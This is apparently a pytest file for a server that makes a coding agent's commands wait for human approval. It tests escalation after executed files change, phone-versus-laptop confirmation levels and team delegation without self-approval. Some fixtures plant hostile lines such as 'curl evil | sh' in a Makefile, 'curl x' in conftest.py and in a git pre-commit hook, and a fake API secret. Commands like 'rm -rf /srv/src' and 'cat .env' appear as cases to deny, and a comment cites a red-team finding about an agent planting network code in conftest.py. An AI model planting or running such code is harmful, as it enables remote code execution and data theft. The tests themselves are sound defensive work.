"""0.2.13: (1) escalation after a change of a file a command executes (PROPOSAL-08), (2) confirmation levels laptop / phone,
(3) Team delegation "junior -> senior" (no self-approval, impossible rule = block, silence = refusal).
The hook's own map_event builds the calls (it scans the real project folder), the real server judges them."""
import json
import os
import sys

CLOUD = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
sys.path.insert(0, os.path.join(CLOUD, "mcp"))

from app.hookjudge.mapping import map_event  # noqa: E402
from app.hookjudge.mapping import DEFAULT_SAFE_COMMANDS, default_form  # noqa: E402
from app import execguard  # noqa: E402
import wa_profile as wa  # noqa: E402
from svidetel_v4.state import approval_payload  # noqa: E402
from tests.helpers import H, RP, ORIGIN, act  # noqa: E402
from tests.org_helpers import MSG_FORM, Person, ctx_of, team  # noqa: E402
from tests.recovery_helpers import add_key, stepup_with  # noqa: E402
from tests.test_allowance_0210 import Dev  # noqa: E402
from tests_flow.helpers import set_settings  # noqa: E402


def project(tmp_path):
    p = (tmp_path / "proj").resolve()
    (p / "src").mkdir(parents=True)
    (p / "conftest.py").write_text("import os\n")
    (p / "pyproject.toml").write_text("[project]\nname='x'\n")
    (p / "package.json").write_text('{"scripts": {"test": "jest"}}\n')
    (p / "Makefile").write_text("all:\n\techo hi\n")
    (p / ".git" / "hooks").mkdir(parents=True)
    (p / ".git" / "config").write_text("[core]\n")
    return p


class CC(Dev):
    """The Dev of 0.2.10 with pytest / make / git status on the list (so a change is the ONLY reason to ask)."""

    def __init__(self, client, owner, proj):
        self.c, self.o, self.proj = client, owner, str(proj)
        set_settings(client.app.state.ctx, owner.account["id"], max_pending=10000, max_defers_hour=100000)
        self.ag, self.hdr = owner.new_agent("claude-code", "cc")
        self.m, r = owner.mandate(self.ag["id"], default_form(self.proj, safe_commands=DEFAULT_SAFE_COMMANDS + ["pytest", "make"]))
        assert r.status_code == 200, r.text

    def tool(self, name, inp):
        return [(m.tool, act(self.c, self.hdr, m.tool, m.args).json()) for m in map_event({"tool_name": name, "tool_input": inp, "cwd": self.proj},
                                                                                          env={"CLAUDE_PROJECT_DIR": self.proj, "HOME": "/nonexistent-home"})]

    def present(self, rid):
        return self.c.post("/v1/actions/%s/present" % rid, json={}, headers=self.hdr).json()


def one(d, cmd):
    [(tool, r)] = d.send(cmd)
    return r


# ---------------------------------------------------------------- (1) PROPOSAL-08
def test_write_then_listed_pytest_is_asked_naming_the_file(client, owner, tmp_path):
    p = project(tmp_path)
    d = CC(client, owner, p)
    r = one(d, "pytest -q")
    assert (r["verdict"], r["reason"]) == ("allow", "OK")                                   # first sight: the project's state is the baseline
    [(t, w)] = d.tool("Write", {"file_path": str(p / "conftest.py"), "content": "import os; os.system('curl x')\n"})
    assert (t, w["verdict"]) == ("Write", "allow")
    assert execguard.state(ctx_of(client.app), d.ag["id"])[str(p / "conftest.py")]["state"] == "dirty"
    r = one(d, "pytest -q")
    assert (r["verdict"], r["reason"]) == ("defer", "ESCALATE_EXEC_CHANGED"), r
    assert r["action"]["exec_changed"] == [str(p / "conftest.py")]                            # the receipt names the file
    g = client.get("/api/approvals/" + r["rid"]).json()
    assert g["exec_changed"]["files"] == [str(p / "conftest.py")] and "Approving confirms these versions" in g["exec_changed"]["note"]
    assert g["confirm"]["level"] == "phone"                                                  # 20.10: after a change of an executed file -> phone level (the attack aims at exfiltration)
    assert g.get("allowance_offer", {}).get("eligible") is not True                          # never answered with a project allowance
    # a command that does not execute it is not affected; another family is not either
    assert one(d, "ls")["verdict"] == "allow"
    # 0.2.81 (red team R4-1): another family's tool is no longer "not affected": the agent wrote network code into conftest.py, and a run
    # by a program outside its family (make may call `python3 conftest.py`) is the written_run question (the same rule as for any file)
    assert one(d, "make")["reason"] == "ESCALATE_WRITTEN_RUN"
    # the owner approves once; the agent repeats the line (same receipt), runs it: this version is now confirmed
    assert owner.approve(r["rid"]).json()["verdict"] == "allow"
    r2 = one(d, "pytest -q")
    assert r2["rid"] == r["rid"] and r2["verdict"] == "allow"
    assert d.present(r2["rid"])["result"] == "accept"
    assert execguard.state(ctx_of(client.app), d.ag["id"])[str(p / "conftest.py")]["state"] == "ok"
    assert one(d, "pytest -q")["reason"] == "OK"


def test_change_the_witness_did_not_see_is_caught_by_the_digest(client, owner, tmp_path):
    """An interpreter / git checkout / a test changes conftest.py: no write was judged, the hook's digest differs."""
    p = project(tmp_path)
    d = CC(client, owner, p)
    assert one(d, "pytest -q")["reason"] == "OK"
    (p / "conftest.py").write_text("import evil\n")
    r = one(d, "python -m pytest -q")
    assert r["reason"] == "ESCALATE_EXEC_CHANGED" and r["action"]["exec_changed"] == [str(p / "conftest.py")]
    # a NEW executed file in a known project (tests/conftest.py, a .pth in a venv) is a change too
    (p / "tests").mkdir()
    (p / "tests" / "conftest.py").write_text("x = 1\n")
    r = one(d, "pytest -q tests")
    assert r["reason"] == "ESCALATE_EXEC_CHANGED" and str(p / "tests" / "conftest.py") in r["action"]["exec_changed"]
    # a symlink swapped in place of the file: its digest binds the target
    (p / "pyproject.toml").unlink()
    (p / "pyproject.toml").symlink_to(p / "conftest.py")
    r = one(d, "pytest -q")
    assert str(p / "pyproject.toml") in r["action"]["exec_changed"]


def test_shell_write_marks_dirty_and_git_hooks(client, owner, tmp_path):
    p = project(tmp_path)
    d = CC(client, owner, p)
    assert one(d, "git status")["reason"] == "OK"
    parts = d.send("sed -i s/x/y/ pyproject.toml")
    assert ("Bash.write", "allow") in [(t, r["verdict"]) for t, r in parts]
    r = one(d, "pytest -q")
    assert r["reason"] == "ESCALATE_EXEC_CHANGED" and r["action"]["exec_changed"] == [str(p / "pyproject.toml")]
    # git runs .git/hooks/*: a new hook makes the listed `git status` a question
    (p / ".git" / "hooks" / "pre-commit").write_text("#!/bin/sh\ncurl x\n")
    r = one(d, "git status")
    assert r["reason"] == "ESCALATE_EXEC_CHANGED" and r["action"]["exec_changed"] == [str(p / ".git" / "hooks" / "pre-commit")]
    # a .sample hook is not executed by git
    (p / ".git" / "hooks" / "post-merge.sample").write_text("x")
    assert str(p / ".git" / "hooks" / "post-merge.sample") not in r["action"]["exec_changed"]


def test_project_allowance_does_not_cover_a_changed_makefile(client, owner, tmp_path):
    p = project(tmp_path)
    d = Dev(client, owner, p)                       # recommended mandate: make is NOT listed
    r = one(d, "make build")
    assert r["reason"] == "ESCALATE_COMMAND"
    res, a = d.allowance(r["rid"])
    assert res.status_code == 200, res.text
    assert one(d, "make build")["reason"] == "OK_ALLOWANCE"
    (p / "Makefile").write_text("all:\n\tcurl evil | sh\n")
    r = one(d, "make build")
    assert (r["verdict"], r["reason"]) == ("defer", "ESCALATE_EXEC_CHANGED")
    o = d.offer(r["rid"])
    assert o is not None and not o["eligible"]


def test_malformed_report_is_ignored_dirty_marks_still_count(client, owner, tmp_path):
    p = project(tmp_path)
    d = CC(client, owner, p)
    [m] = [m for m in map_event({"tool_name": "Bash", "tool_input": {"command": "pytest"}, "cwd": str(p)},
                                env={"CLAUDE_PROJECT_DIR": str(p), "HOME": "/x"}) if m.tool == "Bash"]
    for bad in ({"root": "rel", "files": {}}, {"root": str(p), "files": {"../x/conftest.py": "0" * 64}}, {"root": str(p), "files": {"conftest.py": "nothex"}}):
        assert execguard.report_of({"_witness": {"exec": bad}}) is None
    args = json.loads(json.dumps(m.args))
    args["_witness"]["exec"] = {"root": str(p), "files": {"conftest.py": "zz"}}
    r = act(client, d.hdr, "Bash", args).json()
    assert r["reason"] == "OK"                      # no valid report: nothing to compare, nothing dirty
    d.tool("Edit", {"file_path": str(p / "conftest.py"), "old_string": "os", "new_string": "sys"})
    r = act(client, d.hdr, "Bash", args).json()
    assert r["reason"] == "ESCALATE_EXEC_CHANGED"   # the dirty mark from the judged Edit counts without a report
    # an old hook (no `_witness.exec` at all): the same
    del args["_witness"]["exec"]
    assert act(client, d.hdr, "Bash", args).json()["reason"] == "ESCALATE_EXEC_CHANGED"


def test_families_tables_equal_the_hooks():
    """0.2.16: the tables live on the server only (hookjudge/execfiles uses execguard's); the hook gets the signed list of file shapes and
    must pick exactly the files the tables name (families are not sent)."""
    from app.hookjudge import execfiles as h
    from deus_witness.hook import fingerprint
    for name in ("NAMES", "PREFIXES", "SUFFIXES", "DIRS", "EXECUTORS", "SUB_EXECUTORS"):
        assert getattr(h, name) is getattr(execguard, name), name
    spec = fingerprint.Spec(h.scan_list())
    for p in ("a/conftest.py", "x.pth", "build.rs", ".git/hooks/pre-push", ".github/workflows/ci.yml", "pom.xml", ".mvn/jvm.config",
              "init.d/x.gradle", ".git/info/attributes", "usercustomize.py", "settings.gradle.kts", ".vscode/tasks.json", "src/main.py", "README.md"):
        assert h.families_of_path(p) == execguard.families_of_path(p), p
        assert spec.listed(p) == bool(execguard.families_of_path(p)), p
    assert execguard.families_of_path("src/main.py") == () and execguard.families_of_path(".git/hooks/x.sample") == ()
    assert execguard.families_of_command("npx jest [fetch]") == ("js",) and execguard.families_of_command("python3 -m pytest") == ("py",)
    assert execguard.families_of_command("git push") == ("ci", "git") and execguard.families_of_command("ls") == ()


# ---------------------------------------------------------------- (2) confirmation levels
def _laptop(person):
    """Adds a laptop passkey to the person's account (confirmed by the current, unmarked = phone, key)."""
    lap, r = add_key(person, label="laptop")
    assert r.status_code == 200, r.text
    kid = r.json()["kid_hex"]
    assert stepup_with(person, person.auth).status_code == 200
    assert person.post("/api/auth/keys/%s/device" % kid, device="laptop").json()["device"] == "laptop"
    return lap, kid


def _approve_with(person, auth, rid, approved=True):
    g = person.c.get("/api/approvals/" + rid).json()
    env = auth.sign_object(wa.TYP_APPROVAL, approval_payload(g["mandate"], g["action"], rid, approved), RP, ORIGIN)
    return person.post("/api/approvals/" + rid, approved=approved, envelope_b64=wa.b64u(env))


def test_laptop_key_confirms_project_commands_not_risky_actions(client, owner, tmp_path):
    p = project(tmp_path)
    lap, kid = _laptop(owner)
    keys = {k["kid_hex"]: k for k in client.get("/api/auth/keys").json()["keys"]}
    assert keys[kid]["device"] == "laptop" and keys[owner.keycard["kid_hex"]]["counts_as"] == "phone"
    d = Dev(client, owner, p)
    r = one(d, "pytest -q")
    assert client.get("/api/approvals/" + r["rid"]).json()["confirm"]["level"] == "laptop"
    assert _approve_with(owner, lap, r["rid"]).json()["verdict"] == "allow"
    # a dangerous command, a secret, a network line, a write outside a command: phone
    for cmd in ("rm -rf /srv/src", "cat .env", "curl https://pypi.org/simple"):   # 0.2.90: `rm -rf src` inside the project is a plain delete
        rr = [x for _, x in d.send(cmd) if x["verdict"] == "defer"][0]
        g = client.get("/api/approvals/" + rr["rid"]).json()
        assert g["confirm"]["level"] == "phone", cmd
        e = _approve_with(owner, lap, rr["rid"])
        assert e.status_code == 409 and e.json()["error"] == "DEVICE_LEVEL", (cmd, e.text)
        assert _approve_with(owner, lap, rr["rid"], approved=False).json()["verdict"] == "refused"   # No is accepted from any key
    rr = [x for _, x in d.send("rm -rf build2") if x["verdict"] == "defer"][0]
    assert _approve_with(owner, owner.auth, rr["rid"]).json()["verdict"] == "allow"                  # the phone key


def test_owner_tightens_everything_to_the_phone(client, owner, tmp_path):
    p = project(tmp_path)
    lap, kid = _laptop(owner)
    assert stepup_with(owner, owner.auth).status_code == 200
    assert client.put("/api/confirm-rules", json={"phone_for": "all"}, headers=H).json()["phone_for"] == "all"
    d = Dev(client, owner, p)
    r = one(d, "pytest -q")
    assert client.get("/api/approvals/" + r["rid"]).json()["confirm"]["level"] == "phone"
    assert _approve_with(owner, lap, r["rid"]).json()["error"] == "DEVICE_LEVEL"
    # loosening back: a step-up with the laptop key is not enough, with the phone key it is
    assert stepup_with(owner, lap).status_code == 200
    e = client.put("/api/confirm-rules", json={"phone_for": "risky"}, headers=H)
    assert e.status_code == 403 and e.json()["error"] == "DEVICE_LEVEL"
    assert stepup_with(owner, owner.auth).status_code == 200
    assert client.put("/api/confirm-rules", json={"phone_for": "risky"}, headers=H).json()["phone_for"] == "risky"
    assert client.put("/api/confirm-rules", json={"phone_for": "x"}, headers=H).status_code == 422


def test_a_laptop_cannot_promote_itself_to_phone(client, owner):
    lap, kid = _laptop(owner)
    assert stepup_with(owner, lap).status_code == 200
    e = owner.post("/api/auth/keys/%s/device" % kid, device="phone")
    assert e.status_code == 403 and e.json()["error"] == "DEVICE_LEVEL"
    # nor mint a new "phone" key with a laptop signature
    new, r = add_key(owner, signer=lap, label="fake phone")
    assert r.status_code == 409 and r.json()["error"] == "DEVICE_LEVEL"
    # the phone key may promote it; every change is a registry row
    assert stepup_with(owner, owner.auth).status_code == 200
    assert owner.post("/api/auth/keys/%s/device" % kid, device="phone").json()["device"] == "phone"
    rows = [json.loads(r["entry_json"]) for r in ctx_of(client.app).db.q("SELECT entry_json FROM registry_log WHERE entry_json LIKE '%key_device%'")]
    assert [x["key_device"]["device"] for x in rows] == ["laptop", "phone"]
    assert owner.post("/api/auth/keys/%s/device" % kid, device="tablet").status_code == 422


# ---------------------------------------------------------------- (3) delegation junior -> senior
def _team_agent(app):
    owner, bob, carol = team(app)
    ag, hdr = owner.new_agent("demo", "carol-bot")
    from tests.test_quorum import mandate_draft
    dr = mandate_draft(owner, ag["id"], MSG_FORM)
    assert owner.sign_req(dr["req_id"]).json()["mandate_status"] == "active"
    return owner, bob, carol, ag, hdr


def _defer(owner, hdr, ch="news"):
    r = act(owner.c, hdr, "purchase", {"vendor": ch + ".example", "amount_cents": 5000}).json()
    assert r["verdict"] == "defer", r
    return r


def test_delegated_agent_is_confirmed_by_others_never_by_its_operator(app):
    owner, bob, carol, ag, hdr = _team_agent(app)
    carol.stepup()
    e = carol.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid}, headers=H)
    assert e.status_code == 403 and e.json()["error"] == "FORBIDDEN"                           # only the owner assigns
    ctx_of(app).db.x("UPDATE sessions SET stepup_at=0")
    e = owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid}, headers=H)
    assert e.status_code == 403 and e.json()["error"] == "STEPUP_REQUIRED"
    owner.stepup()
    v = owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid}, headers=H).json()
    assert v["current"]["operator_user_id"] == carol.uid and carol.uid not in v["can_confirm_now"] and bob.uid in v["can_confirm_now"]
    r = _defer(owner, hdr)
    g = carol.c.get("/api/approvals/" + r["rid"]).json()
    assert g["confirm"]["delegated"]["you_run_this_agent"] is True
    e = carol.approve(r["rid"])
    assert e.status_code == 409 and e.json()["error"] == "SELF_APPROVAL", e.text
    assert all(x["ref"] != r["rid"] for x in carol.c.get("/api/sig-requests").json())          # not even listed for her
    assert bob.approve(r["rid"]).json()["verdict"] == "allow"
    g = owner.c.get("/api/approvals/" + r["rid"]).json()
    assert g["decided_by"] == {"signers": [bob.uid], "on_behalf_of": carol.uid}                 # the record: who confirmed for whom
    # the operator may always refuse (stopping is never harder)
    r = _defer(owner, hdr, "news2")
    assert carol.approve(r["rid"], approved=False).json()["verdict"] == "refused"


def test_named_approvers_term_and_impossible_rule_blocks(app):
    owner, bob, carol, ag, hdr = _team_agent(app)
    owner.stepup()
    e = owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid, "approvers": [carol.uid]}, headers=H)
    assert e.status_code == 422 and e.json()["error"] == "SELF_APPROVAL"
    v = owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid, "approvers": [bob.uid], "days": 7}, headers=H)
    assert v.status_code == 200, v.text
    r = _defer(owner, hdr)
    e = owner.approve(r["rid"])
    assert e.status_code == 409 and e.json()["error"] == "NOT_DELEGATE"                         # the owner is not a named approver
    assert bob.approve(r["rid"]).json()["verdict"] == "allow"
    # the approvers' term runs out: nobody may confirm -> the next question is blocked at once, never let through
    ctx_of(app).db.x("UPDATE agent_delegations SET approvers=? WHERE agent_id=? AND ended_at IS NULL",
                     (json.dumps({"users": [bob.uid], "until": 1}), ag["id"]))
    r = act(owner.c, hdr, "purchase", {"vendor": "news3.example", "amount_cents": 5000}).json()
    assert (r["verdict"], r["reason"]) == ("deny", "APPROVER_NONE"), r
    # silence is a refusal: a pending question that expires is denied, nothing is approved by time
    owner.stepup()
    owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid}, headers=H)
    r = _defer(owner, hdr, "news4")
    ctx_of(app).db.x("UPDATE actions SET expires=? WHERE rid=?", (1, r["rid"]))
    g = owner.c.get("/v1/actions/" + r["rid"], headers=hdr).json()
    assert g["status"] == "expired" and g["verdict"] != "allow"
    assert bob.approve(r["rid"]).status_code == 409
    # ending the delegation (owner, step-up) is recorded, not deleted
    owner.stepup()
    h = owner.c.delete("/api/agents/%s/delegation" % ag["id"], headers=H).json()
    assert h["current"] is None and len(h["history"]) == 2 and all(x["ended_at"] for x in h["history"])


def test_delegation_needs_a_team(client, owner):
    ag, hdr = owner.new_agent("demo", "solo")
    owner_p = owner
    j = owner_p.post("/api/auth/stepup/begin").json()
    cred = owner_p.auth.login_credential(wa.b64u_dec(j["options"]["challenge"]), RP, ORIGIN)
    owner_p.post("/api/auth/stepup/finish", flow_id=j["flow_id"], credential=cred)
    e = client.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": owner.account["id"]}, headers=H)
    assert e.status_code == 409 and e.json()["error"] == "NOT_A_TEAM"


def test_delegation_with_phone_level_needs_a_phone_approver(app):
    """Levels and delegation together: the only approver holds a laptop key in the policy -> a phone action is blocked (APPROVER_NONE)."""
    owner, bob, carol, ag, hdr = _team_agent(app)
    ctx_of(app).db.x("UPDATE credentials SET device='laptop' WHERE user_id=?", (bob.uid,))
    owner.stepup()
    owner.c.put("/api/agents/%s/delegation" % ag["id"], json={"operator_user_id": carol.uid, "approvers": [bob.uid]}, headers=H)
    r = act(owner.c, hdr, "purchase", {"vendor": "news.example", "amount_cents": 5000}).json()
    assert (r["verdict"], r["reason"]) == ("deny", "APPROVER_NONE")


def test_pack_with_device_marks_and_exec_changed_verifies(app, tmp_path):
    """The evidence pack still verifies with key_device registry rows and an approved command that carried exec_changed."""
    from tests.recovery_helpers import export_to, run_verify
    p = Person(app).register("Pat")
    lap, kid = _laptop(p)
    proj = project(tmp_path)
    d = CC(p.c, p, proj)
    assert one(d, "pytest -q")["reason"] == "OK"
    d.tool("Write", {"file_path": str(proj / "conftest.py"), "content": "x = 2\n"})
    r = one(d, "pytest -q")
    assert r["reason"] == "ESCALATE_EXEC_CHANGED"
    assert _approve_with(p, lap, r["rid"]).status_code == 409                               # 20.10: the laptop key may not confirm it
    assert p.approve(r["rid"]).json()["verdict"] == "allow"                                  # the phone key may
    assert d.present(one(d, "pytest -q")["rid"])["result"] == "accept"
    rc, out = run_verify(export_to(p.c, tmp_path / "pack"), "--offline")
    assert rc == 0 and "RESULT: VALID" in out, out


def test_exec_digests_do_not_eat_the_dlp_budget():
    """The hook's digests are not data: a secret at the end of a long command line is still found with a big `_witness.exec`."""
    from app import toolmap as tm
    files = {"d%03d/conftest.py" % i: "a" * 64 for i in range(200)}
    cmd = "echo " + "x" * (tm.LEAF_LIMIT - 4000) + " sk-" + "b" * 40
    args = {"command": cmd, "_witness": {"commands": ["echo"], "danger": [], "writes": [], "net": [], "cwd": "/p", "exec": {"root": "/p", "files": files, "truncated": False}}}
    act = tm.build_action("ag", tm.preset("claude-code"), "Bash", args, {})
    assert act["data"], "the secret at the end of the line must still be seen"
